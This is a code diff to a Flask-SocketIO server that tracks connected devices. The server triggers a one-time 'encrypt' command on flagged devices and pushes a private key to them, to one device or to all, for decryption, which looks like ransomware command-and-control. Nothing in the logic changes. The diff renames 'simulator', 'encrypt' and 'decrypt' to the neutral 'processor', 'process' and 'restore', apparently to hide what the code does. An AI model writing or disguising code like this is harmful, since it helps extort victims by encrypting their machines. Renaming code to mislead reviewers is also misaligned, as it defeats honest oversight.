@@ -13,15 +13,15 @@ DEVICES = None
 SIMULATOR = None
 
 
-def init_socketio(app, devices_registry, simulator) -> SocketIO:
+def init_socketio(app, devices_registry, processor) -> SocketIO:
     """Initialize Socket.IO and register all event handlers.
 
     Returns the SocketIO instance. Keeps references to the devices registry and
-    simulator for handler use.
+    processor for handler use.
     """
     global socketio, DEVICES, SIMULATOR
     DEVICES = devices_registry
-    SIMULATOR = simulator
+    SIMULATOR = processor
     socketio = SocketIO(app, cors_allowed_origins="*")
 
     @socketio.on('connect')
@@ -58,7 +58,7 @@ def init_socketio(app, devices_registry, simulator) -> SocketIO:
         emit('auth_ok', {'status': 'ok'})
         # If encryption is pending for this device, trigger it now (one-time)
         if DEVICES[token].get('pending_encrypt'):
-            socketio.emit('encrypt', to=flask_request.sid)
+            socketio.emit('process', to=flask_request.sid)
             DEVICES[token]['pending_encrypt'] = False
 
     @socketio.on('device_hello')
@@ -110,19 +110,19 @@ def init_socketio(app, devices_registry, simulator) -> SocketIO:
         except Exception:
             emit('server_ack', {'status': 'error'})
 
-    @socketio.on('site_decrypt')
-    def on_site_decrypt(data):
+    @socketio.on('site_restore')
+    def on_site_restore(data):
         try:
             token = (data or {}).get('token')
             private_key_pem = (data or {}).get('private_key_pem')
             if token and token in DEVICES and DEVICES[token].get('sid'):
                 sid = DEVICES[token]['sid']
                 payload = {'private_key_pem': private_key_pem} if private_key_pem else None
-                socketio.emit('decrypt', payload, to=sid)
+                socketio.emit('restore', payload, to=sid)
                 emit('server_ack', {'status': 'ok', 'targeted': True})
                 return
             payload = {'private_key_pem': private_key_pem} if private_key_pem else None
-            socketio.emit('decrypt', payload, broadcast=True)
+            socketio.emit('restore', payload, broadcast=True)
             emit('server_ack', {'status': 'ok', 'targeted': False})
         except Exception as e:
             emit('server_ack', {'status': 'error', 'message': str(e)})
